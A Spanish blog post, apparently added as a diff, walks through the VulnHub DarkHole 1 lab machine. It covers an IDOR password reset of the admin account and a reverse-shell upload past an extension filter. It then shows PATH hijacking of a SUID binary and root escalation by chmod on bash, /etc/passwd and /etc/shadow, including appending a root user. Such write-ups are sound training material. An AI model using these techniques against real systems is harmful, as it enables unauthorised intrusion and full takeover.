@@ -1,0 +1,404 @@
+---
+layout: post
+
+title: "Writeup DarkHole 1"
+excerpt: 'En este writeup, resolveré la máquina DarkHole 1 de Vulnhub, documentando cada paso y técnica empleada durante el proceso. A lo largo de este análisis, cubriré desde la recolección de información inicial hasta la'
+
+category: writeups
+category_label: "Writeups"
+primary_category_anchor: writeups
+categories:
+  - writeups
+kicker: "Writeups"
+kicker_secondary: "VulnHub"
+tags:
+- 'VulnHub'
+
+post_title: "Writeup DarkHole 1"
+description: "En este writeup, resolveré la máquina DarkHole 1 de Vulnhub, documentando cada paso y técnica empleada durante el proceso. A lo largo de este análisis, cubriré desde la recolección de información inicial hasta la"
+
+slug: darkhole-1
+permalink: /blog/writeups/darkhole-1.html
+
+nav: blog
+
+featured: false
+featured_badge: ""
+featured_lines:
+  - "Burp Suite"
+  - "Reverse Shell"
+  - "LFI"
+
+cover_badge: "VulnHub"
+cover_lines:
+  - "Burp Suite"
+  - "Reverse Shell"
+  - "LFI"
+  
+cover_image: /assets/img/blog/darkhole1/featured_image_darkhole.jpg
+
+reading_time: "9 min de lectura"
+date: 2024-10-15 10:00:00 +0100
+
+toc_html: |
+  <a href="#descripcion">Descripción</a>
+  <a href="#resolucion-de-la-maquina">Resolucion de la maquina</a>
+  <a href="#fase-de-fingerprinting-reconocimiento-reconnaissance">Fase de Fingerprinting / Reconocimiento (Reconnaissance)</a>
+  <a href="#fase-de-footprinting-exploracion-scanning">Fase de Footprinting / Exploración (Scanning)</a>
+  <a href="#post-explotacion">Post Explotacion</a>
+
+---
+
+<p>En este writeup, resolveré la máquina <strong>DarkHole 1</strong> de <strong>Vulnhub</strong>, documentando cada paso y técnica empleada durante el proceso. A lo largo de este análisis, cubriré desde la recolección de información inicial hasta la explotación de vulnerabilidades y la escalada de privilegios, detallando las herramientas utilizadas y los métodos aplicados.</p>
+<p>El objetivo es proporcionar una guía detallada para aquellos interesados en aprender sobre técnicas de pentesting y hacking ético, a través de un enfoque práctico y exhaustivo. Cada etapa del proceso será explicada en detalle para facilitar la comprensión de los desafíos encontrados y las soluciones implementadas. Este writeup está diseñado tanto para novatos como para usuarios avanzados que deseen mejorar sus habilidades en la resolución de máquinas de CTF.</p>
+<pre><code> ____             _    _   _       _        _ 
+|  _ \  __ _ _ __| | _| | | | ___ | | ___  / |
+| | | |/ _` | '__| |/ / |_| |/ _ \| |/ _ \ | |
+| |_| | (_| | |  |   &lt;|  _  | (_) | |  __/ | |
+|____/ \__,_|_|  |_|\_\_| |_|\___/|_|\___| |_|
+                                            
+</code></pre>
+<table>
+<thead>
+<tr>
+<th><strong>Name:</strong></th>
+<th>DarkHole: 1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Date release</strong>:</td>
+<td>18 Jul 2021</td>
+</tr>
+<tr>
+<td><strong>Author:</strong></td>
+<td>Jehad Alqurashi</td>
+</tr>
+<tr>
+<td><strong>Series:</strong></td>
+<td>DarkHole</td>
+</tr>
+<tr>
+<td><strong>Style</strong>:</td>
+<td>Enumeration/Follow the breadcrumbs</td>
+</tr>
+<tr>
+<td><strong>Goal</strong>:</td>
+<td>get root (uid 0) and read the flag file</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong>:</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>Web page:</strong></td>
+<td>https://www.vulnhub.com/entry/darkhole-1,724/</td>
+</tr>
+</tbody>
+</table>
+<h2 id="descripcion">Descripción</h2>
+<p>It's a box for beginners, but not easy, Good Luck</p>
+<p>Hint: Don't waste your time For Brute-Force</p>
+<h2 id="resolucion-de-la-maquina">Resolucion de la maquina</h2>
+<h2 id="fase-de-fingerprinting-reconocimiento-reconnaissance">Fase de Fingerprinting / Reconocimiento (Reconnaissance)</h2>
+<h3>Descubrimiento de IP objetivo en la red</h3>
+<p>Se realiza el descubrimiento de hosts activos en la red mediante netdiscover para identificar la IP de la máquina objetivo:</p>
+<pre><code class="language-sh">netdiscover -i eth0 -r 192.168.88.0/24
+</code></pre>
+<p>Resultado:</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image.png"/></p>
+<p>La máquina objetivo se encuentra en la IP 192.168.88.4.</p>
+<p>Se comprueba la conectividad con la máquina usando ping:</p>
+<pre><code class="language-sh">ping -c 1 192.168.88.4
+</code></pre>
+<p>Resultado:</p>
+<pre><code class="language-sh">PING 192.168.88.4 (192.168.88.4) 56(84) bytes of data.
+64 bytes from 192.168.88.4: icmp_seq=1 ttl=64 time=0.487 ms
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-1.png"/></p>
+<h3>Descubrimiento de puertos y servicios en el host objetivo</h3>
+<p>Se realiza un escaneo de puertos y servicios usando nmap. Para ello se guarda la IP objetivo en una variable llamada IP, a continuacion se escanean todos los puertos del objetivo para despues extraerlos a una lista.</p>
+<p>Comandos:</p>
+<pre><code class="language-sh">export IP=192.168.88.4
+nmap -p- $IP
+nmap -p- $IP | awk '{print $1}' | grep -E '^[0-9]+' | cut -d'/' -f1 | paste -sd, - &gt; puertos.txt
+cat puertos
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-3.png"/></p>
+<p>Con la lista de los puertos obtenidos se realiza un escaneo de los servicios que estan corriendo en esos puertos, el sistema operativo de la maquina objetivo y los scripts comunes para obtener informacion del objetivo mediante el comando:</p>
+<pre><code class="language-sh">nmap -sS -sV -sC -O $IP -oA scan
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-4.png"/></p>
+<p>Descubrimos que la máquina tiene un servidor HTTP en el puerto 80 y un servidor SSH en el puerto 22 y que corre un sistema operativo: Linux 4.X o 5.X</p>
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache httpd 2.4.41 ((Ubuntu))</td>
+</tr>
+</tbody>
+</table>
+<h2 id="fase-de-footprinting-exploracion-scanning">Fase de Footprinting / Exploración (Scanning)</h2>
+<h3>Exploracion puerto 80</h3>
+<p>Navegamos al puerto 80 para analizar el sitio web, buscando vulnerabilidades como fallos de configuración o funcionalidades ocultas.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-6.png"/></p>
+<p>Se descubre una pagina de login.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-7.png"/></p>
+<p>Se puede pensar en hacer fuerza bruta, pero el laboratorio nos da como consejo inicial que no se pierda tiempo en ello.</p>
+<p>Tambien se descubre una pagina de registro.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-8.png"/></p>
+<p>Los campos de este formulario de registro son un poco confusos por lo que se investiga el codigo del formulario</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-10.png"/></p>
+<p>Se obtiene que el campo 1 es el nombre de usuario, el campo 2 es el email y el campo 3 es la clave para el usuario. Todos estos campos son obligatorios.</p>
+<h3>Explotacion</h3>
+<h4>Registro de nuevo usuario en el sistema</h4>
+<p>Se realiza el registro un usuario de prueba con los siguientes datos:</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>email</th>
+<th>clave</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>test</td>
+<td>test@test.com</td>
+<td>test</td>
+</tr>
+</tbody>
+</table>
+<p>Se comprueba el acceso con el usuario test recien creado y se obtiene acceso.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-11.png"/></p>
+<h4>Abuso de navegacion en el sistema</h4>
+<p>Se aprecia que en la barra de navegacion aparece el ID del usuario</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-12.png"/></p>
+<p>Se intenta comprobar si se tiene acceso a otros usuarios cambiando el ID en la barra de direcciones.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-13.png"/></p>
+<p>No tenemos acceso a la informacion de otro usuario al cambiar el valor de ID en la barra de direcciones.</p>
+<p>Esta prueba no tuvo un final exitoso.</p>
+<h4>Abuso de cambio de contraseña</h4>
+<p>En esta pagina existen dos formularios con los que podriamos gestionar el usuario con el que estamos logados.</p>
+<p>El primer formulario tiene como codigo:</p>
+<pre><code class="language-html">&lt;form name="event" method="post"&gt;
+    &lt;input type="text" name="username" value="test"&gt;
+    &lt;input type="email" name="email" value="test@test.com"&gt;
+    &lt;input type="submit" id="fsubmit" value="Update" class="button"&gt;
+&lt;/form&gt;
+</code></pre>
+<p>Y el segundo:</p>
+<pre><code class="language-html">&lt;form name="event" method="post"&gt;
+    &lt;input type="password" name="password" id="ftitle" placeholder="New Password"&gt;
+    &lt;input type="hidden" name="id" value="2"&gt;
+    &lt;input type="submit" id="fsubmit" value="Change" class="button"&gt;
+&lt;/form&gt;
+</code></pre>
+<p>Como se puede apreciar existe un campo de tipo hidden (oculto) que contiene el valor del id. Este valor se enviara cuando se lance el boton submit.</p>
+<p>Se va a probar el envio del formulario cambiando el valor del id antes de su envio.</p>
+<p>Para ello uso burpsuite y se accede al panel de usuario "test" para probar el cambio de clave.</p>
+<p>Se rellena el formulario con una clave nueva "nuevaclave" y antes de pulsar el boton "change" se activa el interceptador en burpsuite para capturar el request de la pagina.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-14.png"/></p>
+<p>Lo pasamos al modulo de repeater de burpsuite para modificar la peticion y enviarla con el valor de id=1.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-15.png"/></p>
+<p>Se pulsa el boton "send" y en el panel "Response" se obtiene el mensaje "Password has been updated". Por lo que se comprueba que ha funcionado el cambio de clave para el usuario con id=1</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-16.png"/></p>
+<p>Se prueba a acceder con el usuario "admin" y la clave nueva que se ha establecido "nuevaclave"</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-17.png"/></p>
+<p>Y se consigue el acceso al panel del usuario admin</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-18.png"/></p>
+<p>Este panel es diferente ya que añade un modulo en el cual se permite la carga de ficheros.</p>
+<h4>Abuso del modulo de subida de ficheros al servidor</h4>
+<p>Voy a realizar la subida de una shell reversa en el servidor web a traves del modulo de subida de ficheros para de esta forma obtener una shell en la maquina objetivo.</p>
+<p>El primer paso sera obtener la ip de la maquina atacante</p>
+<pre><code class="language-sh">ifconfig eth0
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-19.png"/></p>
+<p>A continuación necesito generar un fichero que contenga una shell reversa.</p>
+<p>Como se ha visto las paginas que carga el servidor son paginas php, por lo que idealmente podriamos cargar una shell en un fichero php.</p>
+<p>Para ello puedo usar la herramienta Reverse Shell Generator que se puede encontrar en <a href="https://www.revshells.com/">revshells.com</a> configurando los parametros y eligiendo el tipo de listener a usar.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-20.png"/></p>
+<p>Obtengo un codigo malicioso para crear un fichero php con una shell reversa a la maquina atancante.</p>
+<p>Creo un fichero llamado antivirus.php donde insertare el codigo que he obtenido de la web revshells.com</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-21.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-22.png"/></p>
+<p>Los parametros que he definido en el archivo malicioso son la IP 192.168.88.3 y el puerto 7331, con ello levanto netcat como listener en dicho puerto</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-23.png"/></p>
+<p>Subo el fichero antivirus.php.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-24.png"/></p>
+<p>Al subirlo el servidor nos responde que no se pudo subir ya que solo permite ficheros jg, png y gif</p>
+<p>Renombro el fichero con la extension phtml</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-27.png"/></p>
+<p>Y realizo de nuevo la subida del fichero.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-26.png"/></p>
+<p>Veo que me da el mensaje Upload File Successful y me da enlace al fichero subido.</p>
+<p>Accedo al enlace para ejecutar el codigo malicioso en el servidor y con ello obtener la shell al sistema.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-29.png"/></p>
+<p>Se ha conseguido acceso al sistema con el usuario www-data</p>
+<h2 id="post-explotacion">Post Explotacion</h2>
+<h3>Enumeracion local</h3>
+<h4>Enumeracion del sistema</h4>
+<p>Comandos:</p>
+<pre><code class="language-sh">hostname
+cat /etc/issue
+cat /etc/*release
+uname -a
+lscpu
+df -h
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-31.png"/></p>
+<h4>Enumeracion de usuarios del sistema</h4>
+<p>Comandos:</p>
+<pre><code class="language-sh">whoami
+groups root
+cat /etc/passwd | grep sh
+groups
+who
+lastlog | grep "Never"
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-32.png"/></p>
+<p>Con estos comandos he conseguido saber lo siguiente:</p>
+<ul>
+<li>El unico usuario con permisos root es el usuario root</li>
+<li>El usuario www-data solo es miembro de www-data</li>
+<li>Existen tres usuario en la maquina objetivo con posiblidad de acceder a una terminal: <code>root</code>, <code>darkhole</code> y <code>john</code></li>
+<li>La ultima vez que han hecho login en la maquina los usuarios.</li>
+</ul>
+<h4>Enumeración de Red</h4>
+<p>Compruebo la enumeracion de la red sin obtener grandes hallazgos que no conociese ya.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-33.png"/></p>
+<h4>Enumeracion de SUID</h4>
+<p>Ejecuto el comando:</p>
+<pre><code class="language-sh">find / -perm -4000 2&gt;/dev/null
+</code></pre>
+<p>y obtengo:</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-34.png"/></p>
+<p>En este listado hay un directorio que me llama la atencion del usuario john</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-35.png"/></p>
+<p>Compruebo el contenido de la carpeta home del usuario john</p>
+<p>Comando:</p>
+<pre><code class="language-sh">cd /home/john
+ls -lisah
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-36.png"/></p>
+<p>En esta carpeta llama la atencion la carpeta .ssh que tiene permisos para el grupo www-data y el fichero <code>toto</code> ya encontrado anteriormente que tiene activo el bit SUID.</p>
+<h3>Escalada de privilegios</h3>
+<p>Voy a realizar la escalada de privilegios apoyandome en los hallazgos obtenidos en la enumeracion local.</p>
+<h4>Escalada de privilegio sobre ejecutable de sistema</h4>
+<p>Al ejecutar .toto se comprueba que ejecuta el comando <code>id</code> del sistema.</p>
+<p>Podemos crear nuestra propia version del comando <code>id</code> para abusar de permisos de ejecucion y obtener una shell con permisos del usuario.</p>
+<p>Para hacer esto tengo que estar en una carpeta con permisos de escritura, habitualmente linux tiene definida la carpeta /tmp como carpeta con permisos de escritura para todos los usuarios.</p>
+<pre><code class="language-sh">cd /tmp
+</code></pre>
+<p>A continuacion creo el fichero id al cual le añadire una linea con la llamada a /bin/bash</p>
+<pre><code class="language-sh">echo '/bin/bash' &gt; id
+</code></pre>
+<p>Le cambiamos los permisos con el comando</p>
+<pre><code class="language-sh">chmod 777 id
+</code></pre>
+<p>En el PATH del sistema añadimos como primera carpeta la carpeta /tmp</p>
+<pre><code class="language-sh">export PATH=/tmp:$PATH
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-37.png"/></p>
+<p>A continuacion ejecuto el fichero <code>toto</code> y obtengo una shell desde el usuario john.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-39.png"/></p>
+<p>Compruebo la carpeta del usuario</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-40.png"/></p>
+<p>El usuario john es propietario de varios archivos</p>
+<ul>
+<li>file.py</li>
+<li>user.txt</li>
+<li>password</li>
+</ul>
+<p>Si compruebo el contenido de estos ficheros obtengo la flag para el usuario john, y una clave.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-41.png"/></p>
+<pre><code class="language-sh">flag DarkHole{You_Can_DO_It}
+</code></pre>
+<p>Compruebo el acceso al sistema con john:root123 atraves de ssh.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-42.png"/></p>
+<p>Compruebo desde el usuario john sobre que binarios tiene permisos de ejecucion de root con el comando:</p>
+<pre><code class="language-sh">sudo -l
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-43.png"/></p>
+<p>Obtengo que tiene permisos de ejecucion sobre el binario file.py</p>
+<p>Compruebo el fichero file.py</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-44.png"/></p>
+<p>El fichero file.py esta vacio. Voy a abusar de los permisos de ejecucion en este fichero añadiendole codigo.</p>
+<p>Dependiendo del codigo que añada puedo conseguir el acceso root de diferentes formas:</p>
+<h4>Escalada de privilegios a root – Tecnica # 01 – setting SUID bit on /bin/bash</h4>
+<p>Puedo establacer el bit SUID a /bin/bash si añado el siguiente contenido al fichero file.py</p>
+<p>Comandos:</p>
+<pre><code class="language-sh">#file.py 
+import os;
+os.system('chmod +s /bin/bash')
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-45.png"/></p>
+<p>Ahora ejecuto file.py como usuario root</p>
+<pre><code class="language-sh">sudo -u root /usr/bin/python3 /home/john/file.py
+</code></pre>
+<p>El sistema nos solicita la clave para john y ejecuta el contenido de file.py estableciendo el bit SUID para /bin/bash</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-46.png"/></p>
+<p>Ahora ejecuto una instancia de bash</p>
+<pre><code class="language-sh">bash -p
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-47.png"/></p>
+<p>Y consigo obtener el acceso con permisos de root.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-48.png"/></p>
+<h4>Escalada de privilegios a root – Tecnica # 02 – PASSWD file</h4>
+<p>Puedo añadir un usuario al fichero /etc/passwd para poder acceder con permisos root al sistema</p>
+<p>Comandos:</p>
+<pre><code class="language-sh">#file.py 
+import os;
+os.system('chmod 777 /etc/passwd')
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-49.png"/></p>
+<p>Ahora ejecuto file.py como usuario root</p>
+<pre><code class="language-sh">sudo -u root /usr/bin/python3 /home/john/file.py
+</code></pre>
+<p>Compruebo que el fichero <code>/etc/passwd</code> ahora tiene permisos completos.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-50.png"/></p>
+<p>A continuacion añado al usuario <code>ibl4zqu3z</code> con clave <code>123</code> en el fichero <code>/etc/passwd</code> con permisos de root sobre /bin/bash</p>
+<pre><code class="language-sh">echo 'ibl4zqu3z:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-51.png"/></p>
+<p>Esto me permite que al cambiar al usuario <code>ibl4zqu3z</code> en la maquina haga un login con permisos de root desde el usuario john.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-53.png"/></p>
+<h4>Escalada de privilegios a root – Tecnica # 03 – SHADOW file</h4>
+<p>Puedo establecer una clave en el fichero /etc/shadow para cualquier usuario de la maquina</p>
+<p>Comandos:</p>
+<pre><code class="language-sh">#file.py 
+import os;
+os.system('chmod 777 /etc/shadow')
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-54.png"/></p>
+<p>Ahora ejecuto file.py como usuario root</p>
+<pre><code class="language-sh">sudo -u root /usr/bin/python3 /home/john/file.py
+</code></pre>
+<p>Compruebo que el fichero <code>/etc/shadow</code> ahora tiene permisos completos.</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-55.png"/></p>
+<p>A continuacion genero un hash de contraseña de tipo SHA-512 para cambiarle la contraseña al usuario root por la clave <code>123</code></p>
+<p>Comando:</p>
+<pre><code class="language-sh">openssl passwd -6
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-56.png"/></p>
+<p>Accedo al fichero /etc/shadow y realizo el cambio de contraseña</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-57.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-58.png"/></p>
+<p>Con esto ya podemos hacer login con el usuario y obtener el acceso root</p>
+<p><img alt="alt text" src="/assets/img/blog/darkhole1/image-59.png"/></p>
